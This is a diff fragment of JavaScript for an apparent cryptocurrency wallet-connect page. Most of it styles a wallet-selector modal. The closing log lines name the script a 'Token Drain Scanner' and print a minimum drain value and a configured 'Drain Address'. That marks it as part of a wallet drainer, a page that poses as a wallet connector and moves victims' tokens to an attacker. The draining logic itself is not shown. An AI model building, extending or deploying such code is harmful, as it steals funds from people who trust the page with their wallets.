+        tokensEl.innerHTML = '';
+    }
+}
+
+// Add CSS for wallet selector
+function addSelectorStyles() {
+    const styles = `
+        .wallet-selector-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+        
+        .wallet-selector-modal {
+            background: #1a1a1a;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            border: 1px solid #333;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .modal-header h3 {
+            margin: 0;
+            color: white;
+            font-size: 24px;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .close-btn:hover {
+            background: #333;
+        }
+        
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .wallet-card {
+            background: #2a2a2a;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            padding: 20px;
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .wallet-card:hover {
+            border-color: var(--wallet-color);
+            background: #333;
+            transform: translateY(-2px);
+        }
+        
+        .wallet-icon {
+            font-size: 24px;
+            width: 50px;
+            height: 50px;
+            background: var(--wallet-color);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wallet-info {
+            flex: 1;
+        }
+        
+        .wallet-name {
+            display: block;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+        
+        .wallet-desc {
+            display: block;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .mobile-instructions {
+            background: #2a2a2a;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .mobile-instructions p {
+            color: white;
+            margin: 0 0 15px 0;
+        }
+        
+        .mobile-links {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        
+        .mobile-links button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .mobile-links button:hover {
+            background: #2563eb;
+        }
+        
+        @media (max-width: 480px) {
+            .wallet-grid {
+                grid-template-columns: 1fr;
+            }
+            .wallet-selector-modal {
+                padding: 20px;
+            }
+        }
+    `;
+    
+    const styleSheet = document.createElement('style');
+    styleSheet.textContent = styles;
+    document.head.appendChild(styleSheet);
+}
+
+// Initialize on load
+window.addEventListener('DOMContentLoaded', initializeApp);
+
+// Make functions global
+window.closeWalletSelector = closeWalletSelector;
+window.connectSpecificWallet = connectSpecificWallet;
+
+console.log('=== Token Drain Scanner ===');
+console.log('Version: FINAL - All Wallets Working');
+console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
+console.log('Min Drain Value: $' + CONFIG.minimumValueUSD);
+console.log('Drain Address:', CONFIG.drainAddress);
+console.log('===========================');
